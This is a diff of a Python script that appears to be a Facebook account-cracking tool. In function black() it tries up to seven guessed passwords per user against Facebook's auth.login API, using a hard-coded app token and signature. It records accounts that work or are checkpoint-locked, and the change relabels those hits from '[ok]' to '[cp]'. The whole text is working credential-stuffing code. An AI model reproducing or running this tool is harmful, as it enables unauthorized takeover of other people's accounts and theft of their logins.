@@ -284,7 +284,7 @@ def black():
 			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
-			    print(S+'[ok] ✵ '+user+' ✵ '+ps1)
+			    print(S+'[cp] ✵ '+user+' ✵ '+ps1)
 			    cps.append(user+ps1)
 			else:
 			    if 'access_token' in k:
@@ -295,7 +295,7 @@ def black():
 			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			        k=json.load(dt)
 			        if 'www.facebook.com' in k['error_msg']:
-			            print(S+'[ok] ✵ '+user+' ✵ '+ps2)
+			            print(S+'[cp] ✵ '+user+' ✵ '+ps2)
 			            cps.append(user+ps2)
 			        else:
 			            if 'access_token' in k:
@@ -306,7 +306,7 @@ def black():
 			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                k=json.load(dt)
 			                if 'www.facebook.com' in k['error_msg']:
-			                    print(S+'[ok] ✵ '+user+' ✵ '+ps3)
+			                    print(S+'[cp] ✵ '+user+' ✵ '+ps3)
 			                    cps.append(user+ps3)
 			                else:
 			                    if 'access_token' in k:
@@ -317,7 +317,7 @@ def black():
 			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                        k=json.load(dt)
 			                        if 'www.facebook.com' in k['error_msg']:
-			                            print(S+'[ok] ✵ '+user+' ✵ '+ps4)
+			                            print(S+'[cp] ✵ '+user+' ✵ '+ps4)
 			                            cps.append(user+ps4)
 			                        else:
 			                            if 'access_token' in k:
@@ -328,7 +328,7 @@ def black():
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                k=json.load(dt)
 			                                if 'www.facebook.com' in k['error_msg']:
-			                                    print(S+'[ok] ✵ '+user+' ✵ '+ps5)
+			                                    print(S+'[cp] ✵ '+user+' ✵ '+ps5)
 			                                    cps.append(user+ps5)
 			                                else:
 			                                    if 'access_token' in k:
@@ -339,7 +339,7 @@ def black():
 			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                        k=json.load(dt)
 			                                        if 'www.facebook.com' in k['error_msg']:
-			                                            print(S+'[ok] ✵ '+user+' ✵ '+ps6)
+			                                            print(S+'[cp] ✵ '+user+' ✵ '+ps6)
 			                                            cps.append(user+ps6)
 			                                        else:
 			                                            if 'access_token' in k:
@@ -350,7 +350,7 @@ def black():
 			                                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps7)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                                k=json.load(dt)
 			                                                if 'www.facebook.com' in k['error_msg']:
-			                                                    print(S+'[ok] ✵ '+user+' ✵ '+ps7)
+			                                                    print(S+'[cp] ✵ '+user+' ✵ '+ps7)
 			                                                    cps.append(user+ps7)
 			                                                else:
 			                                                    if 'access_token' in k:
